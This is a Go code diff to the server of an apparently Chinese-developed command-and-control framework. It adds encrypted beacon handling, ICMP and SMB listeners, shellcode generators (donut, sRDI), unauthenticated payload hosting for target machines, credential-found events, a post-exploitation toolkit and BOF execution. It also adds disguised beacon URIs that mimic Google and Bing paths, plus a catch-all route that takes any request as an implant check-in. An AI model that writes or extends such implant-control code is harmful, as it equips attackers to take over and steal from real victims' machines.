@@ -4,6 +4,7 @@ import (
 	"crypto/tls"
 	"embed"
 	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"html/template"
@@ -45,7 +46,8 @@ type Server struct {
 	startTime    time.Time
 
 	dnsListener         *DNSBeaconListener
-	screenMonitorAgents map[string]time.Time
+	icmpListener        *ICMPBeaconListener
+	screenMonitorImplants map[string]time.Time
 	screenMonitorMu     sync.Mutex
 
 	// P0-3: rportfwd (reverse port forward)
@@ -59,6 +61,12 @@ type Server struct {
 	// WebSocket hubs
 	wsHub   *WebSocketHub
 	chatHub *ChatHub
+
+	// Event system
+	eventManager *EventManager
+
+	// Beacon payload cipher (nil = disabled)
+	beaconCipher *crypto.StreamCipher
 }
 
 func New(cfg *config.Config, database *gorm.DB) *Server {
@@ -81,10 +89,11 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		loginLimiter:        middleware.NewRateLimiter(LoginRateLimit, LoginRateWindow),
 		socksEngine:         newSocksRelayEngine(),
 		startTime:           time.Now(),
-		screenMonitorAgents: make(map[string]time.Time),
+		screenMonitorImplants: make(map[string]time.Time),
 		rportfwdListeners:   make(map[string]*rportfwdRelay),
 		trafficLog:          newTrafficRing(),
 		collab:              newCollabState(),
+		eventManager:        NewEventManager(database),
 		wsUpgrader: websocket.Upgrader{
 			ReadBufferSize:  1024,
 			WriteBufferSize: 1024,
@@ -102,9 +111,68 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		},
 	}
 
+	// Initialize beacon payload cipher if configured
+	if cfg.Crypto.Key != "" {
+		key, err := hex.DecodeString(cfg.Crypto.Key)
+		if err == nil && len(key) == 32 {
+			s.beaconCipher = crypto.NewStreamCipher(key)
+			slog.Info("Beacon payload encryption enabled")
+		} else {
+			slog.Warn("Invalid crypto key (must be 32-byte hex), beacon encryption disabled", "err", err)
+		}
+	}
+
 	s.setupTemplates()
 	s.setupRoutes()
 	s.loadAgentLocks()
+
+	// Register event handlers
+	s.eventManager.On(EventImplantCheckin, func(evt Event) {
+		s.triggerWebhooks(evt)
+		rules := s.loadAutomationRules()
+		for _, rule := range rules {
+			if rule.Enabled && rule.EventType == string(evt.Type) {
+				s.evaluateRule(evt, rule)
+			}
+		}
+	})
+	s.eventManager.On(EventImplantDisconnect, func(evt Event) {
+		s.triggerWebhooks(evt)
+		rules := s.loadAutomationRules()
+		for _, rule := range rules {
+			if rule.Enabled && rule.EventType == string(evt.Type) {
+				s.evaluateRule(evt, rule)
+			}
+		}
+	})
+	s.eventManager.On(EventTaskComplete, func(evt Event) {
+		s.triggerWebhooks(evt)
+		rules := s.loadAutomationRules()
+		for _, rule := range rules {
+			if rule.Enabled && rule.EventType == string(evt.Type) {
+				s.evaluateRule(evt, rule)
+			}
+		}
+	})
+	s.eventManager.On(EventTaskFail, func(evt Event) {
+		s.triggerWebhooks(evt)
+		rules := s.loadAutomationRules()
+		for _, rule := range rules {
+			if rule.Enabled && rule.EventType == string(evt.Type) {
+				s.evaluateRule(evt, rule)
+			}
+		}
+	})
+	s.eventManager.On(EventCredentialFound, func(evt Event) {
+		s.triggerWebhooks(evt)
+		rules := s.loadAutomationRules()
+		for _, rule := range rules {
+			if rule.Enabled && rule.EventType == string(evt.Type) {
+				s.evaluateRule(evt, rule)
+			}
+		}
+	})
+	s.registerBuiltinAutomations()
 
 	return s
 }
@@ -178,15 +246,17 @@ func (s *Server) setupTemplates() {
 		},
 		"boolIcon": func(b bool) string {
 			if b {
-				return "✔"
+				return "✅"
 			}
-			return "✘"
+			return "❌"
 		},
 		// Math helpers for pagination (use int64 to match DB counts)
 		"add":      func(a, b int64) int64 { return a + b },
 		"subtract": func(a, b int64) int64 { return a - b },
 		"multiply": func(a, b int64) int64 { return a * b },
 		"int64":    func(v int) int64 { return int64(v) },
+		"shortID":  func(id string) string { if len(id) > 8 { return id[:8] }; return id },
+		"truncate": func(s string, n int) string { if len(s) > n { return s[:n] + "..." }; return s },
 	}
 
 	tmpl, err := template.New("").Funcs(funcMap).ParseFS(templateFS, "templates/*.html")
@@ -230,11 +300,12 @@ func (s *Server) setupRoutes() {
 		auth.GET("/agents/:id/screen", s.handleScreenMonitorPage)
 		auth.GET("/agents/:id/tasks", s.handleGetAgentTasks)
 		auth.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
+		auth.GET("/api/agents", s.handleListAgents)
 		auth.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
 		auth.GET("/agents/:id/token", s.handleTokenPage)
 		auth.GET("/agents/:id/token/list", s.handleGetTokens)
 
-		// ── Agent operations (note, collab, cancel/rerun, delete — no lock) ─
+		// Agent operations (note, collab, cancel/rerun, delete -- no lock)
 		auth.POST("/agents/:id/kill", s.handleKillAgent)
 		auth.POST("/agents/:id/lock", s.handleLockAgent)
 		auth.POST("/agents/:id/unlock", s.handleUnlockAgent)
@@ -356,6 +427,9 @@ func (s *Server) setupRoutes() {
 		auth.POST("/generate/stager", s.handleGenerateStager)
 		auth.POST("/generate/stager_linux", s.handleGenerateStagerLinux)
 		auth.POST("/generate/one-liner", s.handleGenerateOneLiner)
+		auth.POST("/generate/donut", s.handleGenerateDonut)
+		auth.POST("/generate/srdi", s.handleGenerateSRDI)
+		auth.POST("/generate/shellcode", s.handleGenerateShellcode)
 
 		// ── Listeners ───────────────────────────────────────────────────
 		auth.GET("/listeners", s.handleListenersPage)
@@ -364,6 +438,38 @@ func (s *Server) setupRoutes() {
 		auth.POST("/api/listeners", s.handleCreateListener)
 		auth.PUT("/api/listeners/:id", s.handleUpdateListener)
 		auth.DELETE("/api/listeners/:id", s.handleDeleteListener)
+
+		// ── Infrastructure ──────────────────────────────────────────────
+		auth.GET("/infrastructure", s.handleInfrastructurePage)
+		auth.POST("/infrastructure/generate/nginx", s.handleGenerateNginx)
+		auth.POST("/infrastructure/generate/apache", s.handleGenerateApache)
+		auth.POST("/infrastructure/generate/haproxy", s.handleGenerateHAProxy)
+		auth.POST("/infrastructure/acme/provision", s.handleACMECertProvision)
+		auth.GET("/infrastructure/profile/export", s.handleProfileExport)
+
+		// ── Automation ──────────────────────────────────────────────────
+		auth.GET("/automation", s.handleAutomationPage)
+		auth.GET("/api/automation/rules", s.handleListAutomationRules)
+		auth.POST("/api/automation/rules", s.handleSaveAutomationRule)
+		auth.DELETE("/api/automation/rules/:id", s.handleDeleteAutomationRule)
+		auth.POST("/api/automation/rules/:id/toggle", s.handleToggleAutomationRule)
+		auth.GET("/api/webhooks", s.handleListWebhooks)
+		auth.POST("/api/webhooks", s.handleCreateWebhook)
+		auth.DELETE("/api/webhooks/:id", s.handleDeleteWebhook)
+		auth.POST("/api/webhooks/test", s.handleTestWebhook)
+
+		// ── BOF Repository ─────────────────────────────────────────────
+		auth.GET("/bof_repo", func(c *gin.Context) {
+			s.renderPage(c, "bof_repo_content", gin.H{"Title": "BOF 仓库", "ActiveNav": "bof_repo"})
+		})
+		auth.GET("/api/bof/repos", s.handleBOFRepoIndex)
+		auth.POST("/api/bof/repos/import", s.handleBOFRepoImport)
+
+		// ── Plugin Management ──────────────────────────────────────────
+		auth.GET("/api/plugins", s.handlePluginList)
+		auth.POST("/api/plugins", s.handlePluginCreate)
+		auth.POST("/api/plugins/:id/toggle", s.handlePluginToggle)
+		auth.DELETE("/api/plugins/:id", s.handlePluginDelete)
 
 		// ── Tasks ───────────────────────────────────────────────────────
 		auth.GET("/tasks", s.handleTaskHistory)
@@ -376,6 +482,7 @@ func (s *Server) setupRoutes() {
 		// ── Credentials ─────────────────────────────────────────────────
 		auth.GET("/credentials", s.handleCredentialsPage)
 		auth.GET("/credentials/export", s.handleExportCredentials)
+		auth.GET("/credentials/:cred_id", s.handleGetCredential)
 		auth.POST("/credentials/add", s.handleAddCredential)
 		auth.DELETE("/credentials/:cred_id", s.handleDeleteCredential)
 
@@ -397,6 +504,13 @@ func (s *Server) setupRoutes() {
 		auth.POST("/api/privesc/result", s.handleProcessPrivescResult)
 		auth.GET("/privesc", s.handlePrivescPage)
 		auth.GET("/api/privesc/history/:id", s.handlePrivescHistory)
+
+		// ── Post-Exploitation Toolkit ────────────────────────────────────
+		auth.GET("/toolkit", s.handleToolkitPage)
+		auth.POST("/toolkit/agents/:id/action", s.handleToolkitQuickAction)
+		auth.GET("/toolkit/results", s.handleToolkitRecentResults)
+		auth.GET("/toolkit/agents/:id/info", s.handleToolkitAgentInfo)
+		auth.GET("/toolkit/agents/:id/tasks", s.handleToolkitAgentTasks)
 
 		// ── Timeline ────────────────────────────────────────────────────
 		auth.GET("/timeline", s.handleTimelinePage)
@@ -433,6 +547,11 @@ func (s *Server) setupRoutes() {
 		auth.POST("/settings/db/vacuum", s.handleDBVacuum)
 		auth.POST("/settings/db/backup", s.handleBackupDatabase)
 		auth.GET("/settings/config/download", s.handleDownloadConfig)
+
+		// ── AI Assistant ────────────────────────────────────────────────
+		auth.GET("/ai", s.handleAIPage)
+		auth.POST("/ai/chat", s.handleAIChat)
+		auth.POST("/ai/config", s.handleAIConfig)
 
 		// ── WebSocket ───────────────────────────────────────────────────
 		auth.GET("/ws", s.handleWebSocket)
@@ -472,10 +591,33 @@ func (s *Server) setupRoutes() {
 
 		// Malleable profile support (similar to Cobalt Strike)
 		api.POST("/generate_204", s.handleBeacon)
-		api.POST("/th", s.handleBeacon)          // for bing like /th?id=...
-		api.GET("/generate_204", s.handleBeacon) // support GET if profile uses
+		api.POST("/th", s.handleBeacon)
+		api.GET("/generate_204", s.handleBeacon)
 		api.GET("/th", s.handleBeacon)
 	}
+
+	// Root-level malleable profile routes (agent beacon_uri does NOT include /api/v1/ prefix)
+	s.router.POST("/generate_204", s.handleBeacon)
+	s.router.GET("/generate_204", s.handleBeacon)
+
+	// Catch-all for profile-defined beacon URIs (e.g. bing /th?id=...)
+	s.router.GET("/th", s.handleBeacon)
+	s.router.POST("/th", s.handleBeacon)
+	s.router.NoRoute(func(c *gin.Context) {
+		// Treat unmatched GET/POST as potential beacon check-in for custom profile URIs
+		if c.Request.Method == "POST" || c.Request.Method == "GET" {
+			s.handleBeacon(c)
+			return
+		}
+		c.JSON(404, gin.H{"error": "not found"})
+	})
+
+// External C2 (redirector-facing, no auth)
+extc2 := s.router.Group("/extc2/v1")
+{
+	extc2.POST("/receive", s.handleExtC2Receive)
+	extc2.POST("/send", s.handleExtC2Send)
+}
 
 	// Build logs
 	auth.GET("/builds", s.handleBuildLogs)
@@ -486,11 +628,21 @@ func (s *Server) setupRoutes() {
 
 	// Multi-User Collaboration
 	auth.GET("/api/collab/locks", s.handleGetLocks)
-	auth.POST("/api/collab/chat", s.handleChatSend)
-	auth.GET("/api/collab/chat", s.handleChatHistory)
 	auth.GET("/api/collab/online", s.handleOnlineUsers)
 	auth.GET("/api/collab/pages", s.handlePagePresence)
 	auth.GET("/api/collab/agent-viewers/:id", s.handleAgentViewers)
+
+	// ── BOF Management ──────────────────────────────────────────────
+	auth.GET("/bof", s.handleBOFPage)
+	auth.POST("/api/bof/upload", s.handleBOFUpload)
+	auth.GET("/api/bof/list", s.handleBOFList)
+	auth.GET("/api/bof/:id/download", s.handleBOFDownload)
+	auth.POST("/api/bof/:id/run", s.handleBOFRun)
+	auth.POST("/api/bof/:id/edit", s.handleBOFEdit)
+	auth.DELETE("/api/bof/:id", s.handleBOFDelete)
+	auth.GET("/api/bof/results", s.handleBOFRecentResults)
+	// Quick BOF execution from agent shell page (upload + run in one step)
+	auth.POST("/agents/:id/bof/quick", s.handleBOFQuickRun)
 
 	// Version update check & hot-update
 	auth.GET("/api/update-check", s.handleUpdateCheck)
@@ -498,10 +650,10 @@ func (s *Server) setupRoutes() {
 	auth.POST("/api/update-check/refresh", s.handleRefreshUpdateCheck)
 	auth.POST("/api/update-check/hot-update", s.handleHotUpdate)
 
-	// Stage serving for Artifact Kit (no auth — stagers are unauthenticated)
+	// Stage serving for Artifact Kit (no auth -- stagers are unauthenticated)
 	s.router.GET("/stage/:xorKey", s.handleServeStage)
 
-	// One-Liner payload hosting (no auth — target machines download these)
+	// One-Liner payload hosting (no auth -- target machines download these)
 	s.router.GET("/payloads/:id/:filename", s.handleServePayload)
 
 	// Screenshot serving (protected)
@@ -532,11 +684,18 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 
 	s.addWSConn(conn, uid, username, roleStr)
 
+	s.wsMutex.Lock()
+	s.wsClients[conn] = true
+	s.wsMutex.Unlock()
+
 	slog.Info("WebSocket client connected", "user", username)
 
 	go func() {
 		defer func() {
 			s.removeWSConn(conn)
+			s.wsMutex.Lock()
+			delete(s.wsClients, conn)
+			s.wsMutex.Unlock()
 			conn.Close()
 			slog.Info("WebSocket client disconnected", "user", username)
 		}()
@@ -591,7 +750,7 @@ func (s *Server) broadcastToClients(message []byte) {
 }
 
 // broadcastAgentNotification sends a notification to all WebSocket clients
-func (s *Server) broadcastAgentNotification(agent db.Agent) {
+func (s *Server) broadcastAgentNotification(agent db.Implant) {
 	payload := map[string]string{
 		"type":     "agent_online",
 		"agent_id": agent.ID,
@@ -674,6 +833,29 @@ func (s *Server) offlineThreshold() time.Duration {
 	return time.Duration(d) * time.Second
 }
 
+// AgentStatusInfo holds display info for an agent's status
+type AgentStatusInfo struct {
+	Status   string // "online", "stale", "offline"
+	Label    string // "在线", "超时", "离线"
+	DotColor string // tailwind bg class
+	BgColor  string // tailwind bg class
+	TextColor string // tailwind text class
+	Anim     string // animate-pulse or empty
+}
+
+func (s *Server) agentStatus(a db.Implant) AgentStatusInfo {
+	since := time.Since(a.LastSeen)
+	threshold := s.offlineThreshold()
+	switch {
+	case since < threshold:
+		return AgentStatusInfo{"online", "在线", "bg-emerald-500", "bg-emerald-50", "text-emerald-700", "animate-pulse"}
+	case since < 30*time.Minute:
+		return AgentStatusInfo{"stale", "超时", "bg-amber-500", "bg-amber-50", "text-amber-700", ""}
+	default:
+		return AgentStatusInfo{"offline", "离线", "bg-red-500", "bg-red-50", "text-red-700", ""}
+	}
+}
+
 // cleanOldFiles recursively removes files older than cutoff in the given dir
 func (s *Server) cleanOldFiles(dir string, cutoff time.Time) {
 	entries, err := os.ReadDir(dir)
@@ -729,6 +911,32 @@ func (s *Server) Run() error {
 	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
 		go s.startTCPListener()
 	}
+	if s.cfg.Server.SMBEnabled && s.cfg.Server.SMBPipe != "" {
+		go s.startSMBListener()
+	}
+
+	// Start ICMP C2 listener if enabled
+	if s.cfg.Server.ICMPEnabled {
+		il := NewICMPBeaconListener(s.cfg.Server.ICMPAddr)
+		il.SetHandler(func(agentID string, reqJSON []byte) []byte {
+			var req beaconRequest
+			if len(reqJSON) > 0 {
+				if err := json.Unmarshal(reqJSON, &req); err != nil {
+					slog.Error("ICMP beacon handler unmarshal error", "err", err)
+				}
+			}
+			if req.UUID == "" {
+				req.UUID = agentID
+			}
+			resp := s.processBeacon(req, "")
+			respJSON, _ := json.Marshal(resp)
+			return respJSON
+		})
+		if err := il.Start(); err != nil {
+			slog.Error("Failed to start ICMP listener", "err", err)
+		}
+		s.icmpListener = il
+	}
 
 	// Start DNS C2 listener if enabled
 	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
@@ -743,7 +951,7 @@ func (s *Server) Run() error {
 			if req.UUID == "" {
 				req.UUID = agentID
 			}
-			resp := s.processBeacon(req)
+			resp := s.processBeacon(req, "")
 			respJSON, _ := json.Marshal(resp)
 			return respJSON
 		})
@@ -834,7 +1042,7 @@ func (s *Server) handleTCPConnection(conn net.Conn) {
 			return
 		}
 
-		resp := s.processBeacon(req)
+		resp := s.processBeacon(req, "")
 
 		respBytes, _ := json.Marshal(resp)
 		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
@@ -877,8 +1085,8 @@ func (s *Server) ActivityMiddleware() gin.HandlerFunc {
 }
 
 // getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
-func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Agent, bool) {
-	var agent db.Agent
+func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Implant, bool) {
+	var agent db.Implant
 	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
 		slog.Error("Agent not found", "agent_id", id, "error", err)
 		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
@@ -929,3 +1137,4 @@ func (s *Server) handleHealthCheck(c *gin.Context) {
 		"goroutine": runtime.NumGoroutine(),
 	})
 }
+
